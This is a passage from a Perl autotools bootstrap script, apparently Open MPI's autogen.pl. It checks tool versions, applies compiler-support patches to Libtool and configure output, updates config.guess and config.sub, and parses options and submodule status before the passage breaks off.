    my @min_version = split(/\./, $req_version);
    my @versions_found = ();

    foreach (@search_path) {
        verbose "   Searching for $_\n";
        my $version = `$_ --version`;
        if (!defined($version)) {
            verbose "  $_ not found\n";
            next;
        }

	# Matches a version string with 1 or more parts possibly prefixed with a letter (ex:
	# v2.2) or followed by a letter (ex: 2.2.6b). This regex assumes there is a space
	# before the version string and that the version is ok if there is no version.
	if (!($version =~ m/\s[vV]?(\d[\d\.]*\w?)/m)) {
	    verbose "  WARNING: $_ does not appear to support --version. Assuming it is ok\n";

	    return;
	}

	$version = $1;

        verbose "     Found $_ version $version; checking version...\n";
        push(@versions_found, $version);

        my @parts = split(/\./, $version);
        my $i = 0;
        # Check every component of the version number
        while ($i <= $#min_version) {
            verbose "       Found version component $parts[$i] -- need $min_version[$i]\n";

            # Check to see if there are any characters (!) in the
            # version number (e.g., Libtool's "2.2.6b" -- #%@#$%!!!).
            # Do separate comparisons between the number and any
            # trailing digits.  You can't just "lt" compare the whole
            # string because "10 lt 2b" will return true.  #@$@#$#@$
            # Libtool!!
            $parts[$i] =~ m/(\d+)([a-z]*)/i;
            my $pn = $1;
            my $pa = $2;
            $min_version[$i] =~ m/(\d+)([a-z]*)/i;
            my $mn = $1;
            my $ma = $2;

            # If the version is higher, we're done.
            if ($pn > $mn) {
                verbose "     ==> ACCEPTED\n";
                return;
            }
            # If the version is lower, we're done.
            elsif ($pn < $mn ||
                ($pn == $mn && $pa lt $ma)) {
                verbose "     ==> Too low!  Skipping this version\n";
                last;
            }

            # If the version was equal, keep checking.
            ++$i;
        }

        # If we found a good version, return.
        if ($i > $#min_version) {
            verbose "     ==> ACCEPTED\n";
            return;
        }
    }

    # if no acceptable version found, reject it
    print "
=================================================================
I could not find a recent enough copy of $app.
I need at least $req_version, but only found the following versions:\n\n";

    my $i = 0;
    foreach (@search_path) {
        print "    $_: $versions_found[$i]\n";
        $i++;
    }

    print "\nI am gonna abort.  :-(

Please make sure you are using at least the following versions of the
tools:

    GNU Autoconf: $ompi_autoconf_version
    GNU Automake: $ompi_automake_version
    GNU Libtool: $ompi_libtool_version
=================================================================\n";
    my_exit(1);
}

##############################################################################

sub safe_system {
    print "Running: " . join(/ /, @_) . "\n";
    my $ret = system(@_);
    $ret >>= 8;
    if (0 != $ret) {
        print "Command failed: @_\n";
        my_exit($ret);
    }
    $ret;
}

##############################################################################

# Apply one of the ltmain.sh patches, telling a harmless "all hunks
# rejected" (the Libtool we ship doesn't need this patch) apart from a
# dangerous "some hunks applied, some rejected" (the patch has rotted and
# is now only partially protecting us).  When any hunk is rejected,
# patch(1) writes a .rej file listing those hunks.  We count the hunks in
# both the patch and the .rej to distinguish a total miss (all hunks
# rejected) from a partial one (only some rejected).
sub apply_ltmain_patch {
    my ($patch_file, $desc, $indent_str, $depends_note) = @_;

    my $patch_base = $patch_file;
    $patch_base =~ s{.*/}{};

    # Give each patch its own reject file.  The patches share a single
    # target (config/ltmain.sh), so if they all wrote to patch(1)'s
    # default config/ltmain.sh.rej, a later patch's rejects would clobber
    # an earlier patch's -- destroying exactly the file an earlier
    # warning just told the developer to inspect.  The -r option used to
    # redirect the rejects is supported by both GNU and BSD patch.
    my $reject_base = $patch_base;
    $reject_base =~ s/\.diff$//;
    my $reject_file = "config/ltmain.sh.$reject_base.rej";

    unlink($reject_file);
    my $status = system("$patch_prog -N -p0 -r $reject_file < $patch_file >/dev/null 2>&1");

    # Decode patch(1)'s exit status.  It returns 0 when every hunk
    # applied cleanly, 1 when some hunks were rejected (which leaves a
    # .rej -- handled below), and 2 or higher for serious trouble: the
    # patch or target file couldn't be read, patch itself couldn't be
    # run (127), and so on.  Those serious failures do *not* leave a
    # .rej behind, so checking only for the .rej file would silently
    # miss them and leave config/ltmain.sh in an unknown state.
    my $exit_code;
    if ($status == -1 || ($status & 127)) {
        # Couldn't launch patch at all, or it died from a signal.
        $exit_code = -1;
    } else {
        $exit_code = $status >> 8;
    }
    if (($exit_code < 0 || $exit_code >= 2) && ! -f $reject_file) {
        print "$indent_str"."ERROR: could not apply the $desc ltmain.sh patch\n";
        print "$indent_str"."       ($patch_prog failed but left no .rej file to inspect).\n";
        print "$indent_str"."       config/ltmain.sh may be in an unknown state; check that\n";
        print "$indent_str"."       '$patch_prog' is installed and that config/$patch_base is\n";
        print "$indent_str"."       readable, then re-run autogen.\n";
        my_exit(1);
    }

    # A clean application leaves no .rej and needs no report.
    if (-f $reject_file) {
        my $total_hunks = count_hunks($patch_file);
        my $rejected_hunks = count_hunks($reject_file);
        # Only a *partial* rejection is suspicious; a complete miss just
        # means this Libtool doesn't need the patch.
        if ($rejected_hunks > 0 && $rejected_hunks < $total_hunks) {
            print "$indent_str"."WARNING: the $desc ltmain.sh patch only partially applied\n";
            print "$indent_str"."         ($rejected_hunks of $total_hunks hunks rejected).  It has likely\n";
            print "$indent_str"."         rotted against this Libtool and needs to be refreshed;\n";
            print "$indent_str"."         see config/$patch_base and the rejects left in\n";
            print "$indent_str"."         $reject_file.\n";
            # Some patches build on top of others (see $depends_note at
            # the call site); if so, point the developer at the patch
            # that may be the real culprit rather than this one.
            if ($depends_note) {
                foreach my $line (split(/\n/, $depends_note)) {
                    print "$indent_str"."         $line\n";
                }
            }
            # Leave the .rej in place so the developer can inspect it.
        } else {
            unlink($reject_file);
        }
    }
}

# Count the number of hunks (lines beginning with "@@") in a patch or
# reject file.
sub count_hunks {
    my ($file) = @_;
    my $count = 0;
    open(my $fh, "<", $file)
        || return 0;
    while (<$fh>) {
        $count++
            if (/^\@\@ /);
    }
    close($fh);
    return $count;
}

sub patch_autotools_output {
    my ($topdir) = @_;

    # Set indentation string for verbose output depending on current directory.
    my $indent_str = "    ";
    if ($topdir eq ".") {
        $indent_str = "=== ";
    }

    # Patch ltmain.sh for the NAG and flang compilers.  These patches are
    # only necessary for some versions of Libtool; they'll [rightfully]
    # fail *in their entirety* if you have a new enough Libtool that
    # doesn't need them, and we don't want to alarm the user in that case.
    # A *partial* rejection, however -- where some hunks apply and others
    # do not -- means the patch has silently rotted against the Libtool we
    # ship (e.g., a context line no longer matches), leaving part of the
    # workaround dead without anyone noticing.  apply_ltmain_patch() tells
    # the two apart and warns loudly about the latter.
    #
    # Order matters: the flang patch must be applied *after* the NAG
    # patch, because some of the flang patch's hunks use context lines
    # ("func_cc_basename $CC" / "case $func_cc_basename_result in") that
    # the NAG patch inserts.  If the NAG patch is skipped or completely
    # rejected (harmless on a new enough Libtool), those flang hunks will
    # be rejected too -- so we tell apply_ltmain_patch() to mention the
    # NAG patch as the likely real cause of a flang partial rejection.
    if (-f "config/ltmain.sh") {
        verbose "$indent_str"."Patching \"-pthread\" option for NAG compiler in ltmain.sh\n";
        apply_ltmain_patch("$topdir/config/ltmain_nag_pthread.diff",
                           "NAG \"-pthread\"", $indent_str);

        verbose "$indent_str"."Patching \"-framework\" option for flang compiler in ltmain.sh\n";
        apply_ltmain_patch("$topdir/config/ltmain_flang_darwin.diff",
                           "flang \"-framework\"", $indent_str,
                           "Note: some of this patch's hunks build on context that the NAG\n" .
                           "\"-pthread\" patch (config/ltmain_nag_pthread.diff) inserts, so a\n" .
                           "rejected or skipped NAG patch can be the real cause -- check it first.");
    }

    # If there's no configure script, there's nothing else to do.
    return
        if (! -f "configure");
    my @verbose_out;

    # Every patch below works around a bug in some range of GNU Autotools
    # versions.  When a bug is fixed upstream -- or the text a patch
    # targets is simply reworded -- the search string stops matching and
    # the patch quietly becomes dead code, which has historically gone
    # unnoticed for years.  Route the patches through this helper so that
    # we can tell the difference between a patch that did something and one
    # that did not, and report the latter.
    my @patch_misses;
    my $record_patch = sub {
        my ($desc, @counts) = @_;
        my $total = 0;
        foreach my $count (@counts) {
            $total += $count
                if ($count);
        }
        if ($total > 0) {
            push(@verbose_out, $indent_str . "Patching $desc\n");
        } else {
            push(@patch_misses, $desc);
        }
    };

    # Total ugh.  We have to patch the configure script itself.  See below
    # for explanations why.
    open(IN, "configure") || my_die "Can't open configure";
    my $c;
    $c .= $_
        while(<IN>);
    close(IN);
    my $c_orig = $c;

    foreach my $tag (("", "_FC")) {

        # We have to change the search pattern and substitution on each
        # iteration to take into account the tag changing.
        #
        # Capture the "icc*..." case line and put it back verbatim rather
        # than re-emitting a hard-coded copy of it.  Libtool extends that
        # list over time (2.6.2 added icx* and ifx* for the Intel oneAPI
        # compilers), and writing out our own copy silently reverted those
        # additions.
        my $search_string = '# icc used to be incompatible with GCC.\n\s+' .
                            '# ICC 10 doesn\047t accept -KPIC any more.\n(.*)\n\s+' .
	                    "lt_prog_compiler_wl${tag}=";
        my $replace_prefix = "# Flang compiler
      *flang*)
	lt_prog_compiler_wl${tag}='-Wl,'
	lt_prog_compiler_pic${tag}='-fPIC -DPIC'
	lt_prog_compiler_static${tag}='-static'
        ;;
      # icc used to be incompatible with GCC.
      # ICC 10 doesn't accept -KPIC any more.
";
        my $replace_suffix = "
	lt_prog_compiler_wl${tag}=";

        $record_patch->("configure for flang Fortran ($tag)",
                        ($c =~ s/$search_string/$replace_prefix . $1 . $replace_suffix/e));
    }

    foreach my $tag (("", "_FC")) {

        # Libtool has had the nagfor "--shared" case since well before the
        # oldest Libtool we support, so we only need to add the support for
        # convenience libraries on top of it.
        #
        # We have to change the search pattern and substitution on each
        # iteration to take into account the tag changing
        my $search_string = "whole_archive_flag_spec${tag}=" . '\n\s+' .
            "tmp_sharedflag='--shared' ;;" . '\n\s+' .
            'nagfor\052.*# NAGFOR 5.3\n\s+' .
            "tmp_sharedflag='-Wl,-shared' ;;" . '\n\s+' .
            'xl';
        my $replace_string = "whole_archive_flag_spec${tag}=
	  tmp_sharedflag='--shared' ;;
        nagfor*)                        # NAGFOR 5.3
          whole_archive_flag_spec${tag}='\$wl--whole-archive`for conv in \$convenience\\\"\\\"; do test  -n \\\"\$conv\\\" && new_convenience=\\\"\$new_convenience,\$conv\\\"; done; func_echo_all \\\"\$new_convenience\\\"` \$wl--no-whole-archive'
          compiler_needs_object=yes
          tmp_sharedflag='-Wl,-shared' ;;
	xl";

        $record_patch->("configure for NAG compiler convenience libraries ($tag)",
                        ($c =~ s/$search_string/$replace_string/));
    }

    # Oracle has apparently begun (as of 12.5-beta) removing the "Sun" branding.
    # So this patch (cumulative over the previous one) is required.
    $record_patch->("configure for Oracle Studio Fortran version strings",
                    ($c =~ s/\*Sun\*Fortran\*\)/*Sun*Fortran* | *Studio*Fortran*)/g),
                    ($c =~ s/\*Sun\\ F\*\)(.*\n\s+tmp_sharedflag=)/*Sun\\ F* | *Studio*Fortran*)$1/g));

    # Fix consequence of broken libtool.m4
    # see http://lists.gnu.org/archive/html/bug-libtool/2015-07/msg00002.html and
    # https://github.com/open-mpi/ompi/issues/751
    # The first form is for libtool < 2.4.3, the second for >= 2.4.3.
    # Libtool fixed this itself in 2.5.0, so both are no-ops with a
    # sufficiently new Libtool; they are kept for the older Libtools that
    # libtool_min_version in VERSION still allows.
    $record_patch->("configure for -L/-R libtool.m4 bug",
                    ($c =~ s/# Some compilers place space between "-\{L,R\}" and the path.\n       # Remove the space.\n       if test \$p = \"-L\" \|\|/# Some compilers place space between "-\{L,-l,R\}" and the path.\n       # Remove the spaces.\n       if test \$p = \"-L\" \|\|\n          test \$p = \"-l\" \|\|/g),
                    ($c =~ s/# Some compilers place space between "-\{L,R\}" and the path.\n       # Remove the space.\n       if test x-L = \"\$p\" \|\|\n          test x-R = \"\$p\"\; then/# Some compilers place space between "-\{L,-l,R\}" and the path.\n       # Remove the spaces.\n       if test x-L = \"x\$p\" \|\|\n          test x-l = \"x\$p\" \|\|\n          test x-R = \"x\$p\"\; then/g));

    # Fix OS X Big Sur (11.0.x) support
    # From https://lists.gnu.org/archive/html/libtool-patches/2020-06/msg00001.html
    # Libtool fixed this itself in 2.4.7, so this is a no-op with a
    # sufficiently new Libtool; it is kept for the older Libtools that
    # libtool_min_version in VERSION still allows.
    #
    # Some versions of Libtool use ${wl} consistently, but others did
    # not (e.g., they used $wl).  Make the regexp be able to handle
    # both.  Additionally, the case string searching for 10.[012]*
    # changed over time.  So make sure it can handle both of the case
    # strings that we're aware of.
    my $WL = '(\$\{wl\}|\$wl)';
    my $SOMETIMES = '(\[,.\])*';
    my $search_string = 'darwin\*\) # darwin 5.x on
      # if running on 10.5 or later, the deployment target defaults
      # to the OS version, if on x86, and 10.4, the deployment
      # target defaults to 10.4. Don\'t you love it\?
      case \$\{MACOSX_DEPLOYMENT_TARGET-10.0\},\$host in
	10.0,\*86\*-darwin8\*\|10.0,\*-darwin\[91\]\*\)
	  _lt_dar_allow_undefined=\'' . $WL . '-undefined ' . $WL . 'dynamic_lookup\' ;;
	10.\[012\]' . $SOMETIMES . '\*\)
	  _lt_dar_allow_undefined=\'' . $WL . '-flat_namespace ' . $WL . '-undefined ' . $WL . 'suppress\' ;;
	10.\*\)';
    my $replace_string = 'darwin*)
      # Open MPI patched for Darwin / MacOS Big Sur.  See
      # http://lists.gnu.org/archive/html/bug-libtool/2015-07/msg00001.html
      case ${MACOSX_DEPLOYMENT_TARGET},$host in
      10.[012],*|,*powerpc*)
	  _lt_dar_allow_undefined=\'${wl}-flat_namespace ${wl}-undefined ${wl}suppress\' ;;
      *)';
    $record_patch->("configure for MacOS Big Sur libtool.m4 bug",
                    ($c =~ s/$search_string/$replace_string/g));

    # Fix ifort support on OSX
    # see https://ntq1982.github.io/files/20200621.html
    $search_string = 'case \$cc_basename in
      nagfor\*\)
        # NAG Fortran compiler
        lt_prog_compiler_wl_FC=\'-Wl,-Wl,,\'
        lt_prog_compiler_pic_FC=\'-PIC\'
        lt_prog_compiler_static_FC=\'-Bstatic\'
        ;;';
    $replace_string = "case \$cc_basename in
      flang*)
        # flang compiler
        lt_prog_compiler_wl_FC='-Wl,'
        lt_prog_compiler_pic_FC='-fPIC'
        lt_prog_compiler_static_FC='-static'
        ;;
      icc* | ifort*)
        # Intel Fortran compiler
        lt_prog_compiler_wl_FC='-Wl,'
        lt_prog_compiler_pic_FC='-fno-common -PIC'
        lt_prog_compiler_static_FC=''
        ;;
      nagfor*)
        # NAG Fortran compiler
        lt_prog_compiler_wl_FC='-Wl,-Wl,,'
        lt_prog_compiler_pic_FC='-PIC'
        lt_prog_compiler_static_FC='-Bstatic'
        ;;";
    $record_patch->("configure for ifort on macOS (FC)",
                    ($c =~ s/$search_string/$replace_string/g));

    foreach my $tag (("", "_FC")) {
        $search_string = 'tcc\*\)
	# Fabrice Bellard et al\'s Tiny C Compiler
	lt_prog_compiler_wl'."${tag}".'=\'-Wl,\'
	lt_prog_compiler_pic'."${tag}".'=\'-fPIC\'
	lt_prog_compiler_static'."${tag}".'=\'-static\'
	;;';
        $replace_string = "tcc*)
        # Fabrice Bellard et al's Tiny C Compiler
        lt_prog_compiler_wl${tag}='-Wl,'
        lt_prog_compiler_pic${tag}='-fPIC'
        lt_prog_compiler_static${tag}='-static'
        ;;
    nvc* | nvcc* | nvfortran*)
	# NVIDIA Fortran compiler
        lt_prog_compiler_wl${tag}='-Wl,'
        lt_prog_compiler_pic${tag}='-fPIC'
        lt_prog_compiler_static${tag}='-Bstatic'
        ;;";
        $record_patch->("configure for NVIDIA Fortran compiler (${tag})",
                        ($c =~ s/$search_string/$replace_string/g));
    }

    $search_string = 'case \$cc_basename in
     ifort\*\|nagfor\*\) _lt_dar_can_shared=yes ;;
     \*\) _lt_dar_can_shared=\$GCC ;;
  esac';
    $replace_string = "case \$cc_basename in
     flang*|ifort*|nagfor*) _lt_dar_can_shared=yes ;;
     *) _lt_dar_can_shared=\$GCC ;;
  esac";
    $record_patch->("configure for flang compiler on Darwin (FC): _lt_dar_can_shared",
                    ($c =~ s/$search_string/$replace_string/g));

    $search_string = 'archive_cmds_FC="\\\\\\$CC -dynamiclib';
    $replace_string = 'archive_cmds_FC="\$CC --shared';
    $record_patch->("configure for flang compiler on Darwin (FC): archive_cmds_FC",
                    ($c =~ s/$search_string/$replace_string/g),
                    ($c =~ s/(archive_cmds_FC.*)-install_name \\\$rpath/$1-Wl,-install_name,\\\`echo \\\$rpath | sed \'s%^[ ]*%%\'\\\`/g));

    # Say which patches did nothing.  A patch that matches nothing is
    # either working around a bug that has since been fixed upstream, or
    # is aimed at text that upstream has reworded -- in which case it has
    # silently stopped protecting us.  Either way somebody should look at
    # it.  Note that a few patches below are expected to appear here with
    # a new enough Autotools; they are retained for the older versions
    # that VERSION still permits.
    #
    # Only report for our own configure ($topdir eq "."): these patches are
    # written against what Open MPI's configure contains, and a miss in an
    # embedded package's configure (PMIx and PRRTE have no Fortran, for
    # example) is expected rather than interesting.
    if (@patch_misses && $topdir eq ".") {
        verbose "$indent_str"."Patches that matched nothing with this Autotools:\n";
        foreach my $miss (@patch_misses) {
            verbose "$indent_str"."    $miss\n";
        }
        verbose "$indent_str"."(If a patch is listed here for every Autotools version Open MPI\n";
        verbose "$indent_str"."supports, it is dead code and should be removed from autogen.pl.)\n";
    }

    # Only write out verbose statements and a new configure if the
    # configure content actually changed
    return
        if ($c eq $c_orig);
    foreach my $str (@verbose_out) {
        verbose($str);
    }

    open(OUT, ">configure.patched") || my_die "Can't open configure.patched";
    print OUT $c;
    close(OUT);
    # Use cp so that we preserve permissions on configure
    safe_system("cp configure.patched configure");
    unlink("configure.patched");
}

sub export_version {
    my ($name,$version) = @_;
    $version =~ s/[^a-zA-Z0-9,.]//g;
    my @version_splits = split(/\./,$version);
    my $hex = sprintf("0x%04x%02x%02x", $version_splits[0], $version_splits[1], $version_splits[2]);
    $m4 .= "m4_define([OMPI_${name}_MIN_VERSION], [$version])\n";
    $m4 .= "m4_define([OMPI_${name}_NUMERIC_MIN_VERSION], [$hex])\n";
}

sub export_mpi_version {
    my ($name,$version) = @_;
    $version =~ s/[^a-zA-Z0-9,.]//g;
    $m4 .= "m4_define([$name], [$version])\n";
}

sub get_and_define_min_versions() {

    open(IN, "VERSION") || my_die "Can't open VERSION";
    while (<IN>) {
          my $line = $_;
          my @fields = split(/=/,$line);
          if ($fields[0] eq "automake_min_version") {
              if ($fields[1] ne "\n") {
                  $ompi_automake_version = $fields[1];
              }
          }
          elsif($fields[0] eq "autoconf_min_version") {
              if ($fields[1] ne "\n") {
                  $ompi_autoconf_version = $fields[1];
              }
          }
          elsif($fields[0] eq "libtool_min_version") {
              if ($fields[1] ne "\n") {
                  $ompi_libtool_version = $fields[1];
              }
          }
          elsif($fields[0] eq "pmix_min_version") {
              if ($fields[1] ne "\n") {
                  export_version("PMIX", $fields[1]);
              }
          }
          elsif($fields[0] eq "prte_min_version") {
              if ($fields[1] ne "\n") {
                  export_version("PRTE", $fields[1]);
              }
          }
          elsif($fields[0] eq "hwloc_min_version") {
              if ($fields[1] ne "\n") {
                  export_version("HWLOC", $fields[1]);
              }
          }
          elsif($fields[0] eq "event_min_version") {
              if ($fields[1] ne "\n") {
                  export_version("EVENT", $fields[1]);
              }
          }
          elsif($fields[0] eq "mpi_standard_version") {
              if ($fields[1] ne "\n") {
                  export_mpi_version("MPI_VERSION_NUM", $fields[1]);
              }
          }
          elsif($fields[0] eq "mpi_standard_subversion") {
              if ($fields[1] ne "\n") {
                  export_mpi_version("MPI_SUBVERSION_NUM", $fields[1]);
              }
          }
    }
    close(IN);
}

sub in_tarball {
    my $tarball = 0;
    open(IN, "VERSION") || my_die "Can't open VERSION";
    # If repo_rev is not an empty string, we are in a tarball
    while (<IN>) {
          my $line = $_;
          my @fields = split(/=/,$line);
          if ($fields[0] eq "repo_rev") {
              if ($fields[1] ne "\n") {
                  $tarball = 1;
                  last;
              }
          }
    }
    close(IN);
    return $tarball;
}

##############################################################################

sub replace_config_sub_guess {
    # This could be simpler if we could use some Perl modules for this
    # functionality (e.g., DateTime).  But I don't want to introduce
    # any CPAN dependencies here, so just do sometime simple, even if
    # it's a bit laborious. Use a few private helper functions for
    # this kind of functionality.

    sub _get_timestamp {
        my $filename = shift;

        my $ret;
        if (-x $filename) {
            my $out = `$filename --version`;
            $out =~ m/GNU config\.[a-z]+ \((.+)\)/;
            $ret = $1;
        }

        return $ret;
    }

    sub _split_timestamp {
        my $ts = shift;

        $ts =~ m/(\d+)-(\d+)-(\d+)/;
        return $1, $2, $3;
    }

    # Returns true if timestamp $a > timestamp $b.
    sub _timestamp_gt {
        my ($a, $b) = @_;

        my ($year_a, $month_a, $day_a) = _split_timestamp($a);
        my ($year_b, $month_b, $day_b) = _split_timestamp($b);

        # Don't try to be clever -- just do a simple set of explicit
        # comparisons.
        if ($year_a > $year_b) {
            return 1;
        } elsif ($year_a < $year_b) {
            return 0;
        } else {
            if ($month_a > $month_b) {
                return 1;
            } elsif ($month_a < $month_b) {
                return 0;
            } else {
                if ($day_a > $day_b) {
                    return 1;
                } else {
                    return 0;
                }
            }
        }
    }

    my ($topdir) = @_;

    # Find the stashed known-good files, and get their version
    # timestamps.
    my $cached_dir = "$topdir/config/from-savannah";
    my @files = qw/config.guess config.sub/;
    my %known_good_timestamps;
    foreach my $file (@files) {
        my $filename = "$cached_dir/upstream-$file";
        my_die("Cannot find $filename")
            if (! -f $filename);

        my $ts = _get_timestamp($filename);
        $known_good_timestamps{$file} = $ts;
    }

    # Find all config.guess/config.sub files in the tree.  If their
    # versions are older than the stashed known-good files, update
    # them from the stash.
    my @files;
    File::Find::find(sub {
        push(@files, $File::Find::name)
            if ($_ eq "config.guess" ||
                $_ eq "config.sub") }, $topdir);

    foreach my $file (@files) {
        # Skip anything in the 3rd-party tree
        next
            if ($file =~ /\/3rd-party\//);

        my $base = basename($file);
        my $ts = _get_timestamp($file);
        if (_timestamp_gt($known_good_timestamps{$base}, $ts)) {
            print("=== Replacing $file with newer version\n");
            safe_system("cp -f $cached_dir/upstream-$base $file");
        }
    }
}

##############################################################################
##############################################################################
## main - do the real work...
##############################################################################
##############################################################################

# Command line parameters

my $ok = Getopt::Long::GetOptions("no-3rdparty=s" => \$no_3rdparty_arg,
                                  "quiet|q" => \$quiet_arg,
                                  "debug|d" => \$debug_arg,
                                  "help|h" => \$help_arg,
                                  "platform=s" => \$platform_arg,
                                  "include=s" => \$include_arg,
                                  "exclude=s" => \$exclude_arg,
                                  "force|f" => \$force_arg,
                                  "jobs|j=i" => \$automake_jobs,
    );

if (!$ok || $help_arg) {
    print "Invalid command line argument.\n\n"
        if (!$ok);
    print "Options:
  --no-3rdparty <package>       Do not build the listed 3rd-party package (comma separtated list)
  --quiet | -q                  Do not display normal verbose output
  --debug | -d                  Output lots of debug information
  --help | -h                   This help list
  --platform | -p               Specify a platform file to be parsed for no_build
                                and only_build directives
  --include | -i                Comma-separated list of framework-component pairs
                                to be exclusively built - i.e., all other components
                                will be ignored and only those specified will be marked
                                to build
  --exclude | -e                Comma-separated list of framework or framework-component
                                to be excluded from the build
  --force | -f                  Run even if invoked from the source tree of an expanded
                                distribution tarball
  --jobs | -j #                 Value to set for AUTOMAKE_JOBS\n";
    my_exit($ok ? 0 : 1);
}

#---------------------------------------------------------------------------

# Check for project existence
my $project_name_long = "Open MPI";
my $project_name_short = "openmpi";

my_die "Invalid value for --jobs $automake_jobs. Must be greater than 0."
    if (defined $automake_jobs && $automake_jobs <= 0);

if (defined $automake_jobs) {
    $ENV{'AUTOMAKE_JOBS'} = $automake_jobs;
}

#---------------------------------------------------------------------------

$m4 = "dnl
dnl \$HEADER\$
dnl
$dnl_line
dnl This file is automatically created by autogen.pl; it should not
dnl be edited by hand!!
dnl
dnl Generated by $username at " . localtime($ENV{SOURCE_DATE_EPOCH} || time) . "
dnl on $full_hostname.
$dnl_line\n\n";

#---------------------------------------------------------------------------

# Verify that we're in the OMPI root directory by checking for a token file.

my_die "Not at the root directory of an OMPI source tree"
    if (! -f "config/opal_mca.m4");

my_die "autogen.pl has been invoked in the source tree of an Open MPI distribution tarball; aborting...
You likely do not need to invoke \"autogen.pl\" -- you can probably run \"configure\" directly.
If you really know what you are doing, and really need to run autogen.pl, use the \"--force\" flag."
    if (!$force_arg && in_tarball());

# Now that we've verified that we're in the top-level OMPI directory,
# set the sentinel file to remove if we abort.
$sentinel = Cwd::cwd() . "/configure";

#---------------------------------------------------------------------------

my $step = 1;
verbose "Open MPI autogen (buckle up!)

$step. Checking tool versions\n\n";

get_and_define_min_versions();

# Check the autotools revision levels
&find_and_check("autoconf", $ompi_autoconf_search, $ompi_autoconf_version);
&find_and_check("libtool", $ompi_libtoolize_search, $ompi_libtool_version);
&find_and_check("automake", $ompi_automake_search, $ompi_automake_version);

#---------------------------------------------------------------------------

++$step;
verbose "\n$step. Checking for git submodules\n\n";

my @enabled_3rdparty_packages = ();
my @disabled_3rdparty_packages = split(/,/, $no_3rdparty_arg);
# Alias: 'openpmix' -> 'pmix'
if (list_contains("openpmix", @disabled_3rdparty_packages)) {
    push(@disabled_3rdparty_packages, "pmix");
}

# Make sure we got a submodule-full clone.  If not, abort and let a
# human figure it out.
if (-f ".gitmodules") {
    # Do a quick sanity check to ensure that non-3rd-party
    # submodules are at least present (e.g., they won't be present
    # if you downloaded a GitHub.com-created tarball).
    open(IN, ".gitmodules") ||
        die "Can't open .gitmodules";
    while (<IN>) {
        # Find "path = " lines
        if (!($_ =~ m/^\s+path = (.+)$/)) {
            next;
        }
        my $path = $1;

        # Only care about paths that do not include "3rd-party"
        if (index($path, "3rd-party") != -1) {
            next;
        }

        # Check that the path exists and is non-empty.
        my $happy = 1;
        if (! -d $path) {
            $happy = 0;
        } else {
            opendir(DIR, $path) ||
                my_die "Can't open $path directory";
            my @files = readdir(DIR);
            closedir(DIR);

            $happy = 0
                if ($#files < 2);
        }

        if (!$happy) {
                print("    ==> ERROR: Missing

The submodule \"$path\" is missing.

Perhaps you forgot to \"git clone --recursive ...\", or you need to
\"git submodule update --init --recursive\"...?\n\n");
            exit(1);
        }
    }

    if (-d ".git") {
        open(IN, "git submodule status|")
            || die "Can't run \"git submodule status\"";
        while (<IN>) {
            $_ =~ m/^(.)[0-9a-f]{40}\s+(\S+)/;
            my $status = $1;
            my $path   = $2;

            print("=== Submodule: $path\n");
            if (index($path, "pmix") != -1 and list_contains("pmix", @disabled_3rdparty_packages)) {
                print("Disabled - skipping openpmix");
                next;
            }
            if (index($path, "prrte") != -1 and list_contains("prrte", @disabled_3rdparty_packages)) {
                print("Disabled - skipping prrte");
                next;
            }

            # Make sure the submodule is there
            if ($status eq "-") {
                print("    ==> ERROR: Missing

The submodule \"$path\" is missing.

Perhaps you forgot to \"git clone --recursive ...\", or you need to
\"git submodule update --init --recursive\"...?\n\n");
                exit(1);
            }

            # See if the commit in the submodule is not the same as the
            # commit that the git submodule thinks it should be.
            elsif ($status eq "+") {
                print("    ==> WARNING: Submodule hash is different than upstream.
         If this is not intentional, you may want to run:
         \"git submodule update --init --recursive\"\n");
            } else {
                print("    Local hash is what is expected by the submodule (good!)\n");
            }
        }
    }
}

#---------------------------------------------------------------------------

# Save the platform file in the m4
$m4 .= "dnl Platform file\n";

# Process platform arg, if provided
if ($platform_arg) {
    $m4 .= "m4_define([autogen_platform_file], [$platform_arg])\n\n";
    open(IN, $platform_arg) || my_die "Can't open $platform_arg";
    # Read all lines from the file
    while (<IN>) {
        my $line = $_;
        my @fields = split(/=/,$line);
        if ($fields[0] eq "enable_mca_no_build") {
            if ($exclude_arg) {
                print "The specified platform file includes an
enable_mca_no_build line. However, your command line
also contains an exclude specification. Only one of
these directives can be given.\n";
                my_exit(1);
            }
            $exclude_arg = $fields[1];
        } elsif ($fields[0] eq "enable_mca_only_build") {
            if ($include_arg) {
                print "The specified platform file includes an
enable_mca_only_build line. However, your command line
also contains an include specification. Only one of
these directives can be given.\n";
                my_exit(1);
            }
            $include_arg = $fields[1];
        }
    }
    close(IN);
} else {
    # No platform file -- write an empty list
    $m4 .= "m4_define([autogen_platform_file], [])\n\n";
}

if ($exclude_arg) {
    debug "Using exclude list: $exclude_arg";
    my @list = split(/,/, $exclude_arg);
    foreach (@list) {
        my @pairs = split(/-/, $_);
        if (exists($pairs[1])) {
        # Remove any trailing newlines
            chomp($pairs[1]);
            debug "    Adding ".$pairs[0]."->".$pairs[1]." to exclude list\n";
            push(@{$exclude_list->{$pairs[0]}}, $pairs[1]);
        } else {
            debug "    Adding $pairs[0] to exclude list\n";
            push(@{$exclude_list->{$pairs[0]}}, "AGEN_EXCLUDE_ALL");
        }
    }
}
if ($include_arg) {
    debug "Using include list: $include_arg";
    my @list = split(/,/, $include_arg);
    foreach (@list) {
        my @pairs = split(/-/, $_);
        if (exists($pairs[1])) {
        # Remove any trailing newlines
            chomp($pairs[1]);
            debug "    Adding ".$pairs[0]."->".$pairs[1]." to include list\n";
            push(@{$include_list->{$pairs[0]}}, $pairs[1]);
        }
        # NOTE: it makes no sense to include all as that is the default
        # so ignore that scenario here, if given
    }
}

#---------------------------------------------------------------------------

++$step;
verbose "\n$step. Running template-generating scripts\n\n";

# These scripts generate fortran header files of different types, but
# guaranteed to have the same value (i.e., so humans don't have to
# maintain two sets of files, and potentially have values get out of
# sync).

my @scripts;
push(@scripts, "ompi/include/mpif-values.py");

foreach my $s (@scripts) {
    verbose "=== $s\n";
    if (! -x $s) {
        print "Cannot find executable $s!\nAborting.\n";
        my_exit(1);
    }
    if (system($s) != 0) {
        print "Script failed: $s\n";
        my_exit(1);
    }
}

#---------------------------------------------------------------------------

# Find projects, frameworks, components
++$step;
verbose "\n$step. Searching for projects, MCA frameworks, and MCA components\n";

my $ret;

# Figure out if we're at the top level of the OMPI tree or not.
if (! (-f "VERSION" && -f "configure.ac" && -f $topdir_file)) {
    print("\n\nYou must run this script from the top-level directory of the Open MPI tree.\n\n");
    my_exit(1);
}

# Top-level projects to examine
my $projects;
push(@{$projects}, { name => "opal", dir => "opal", need_base => 1 });
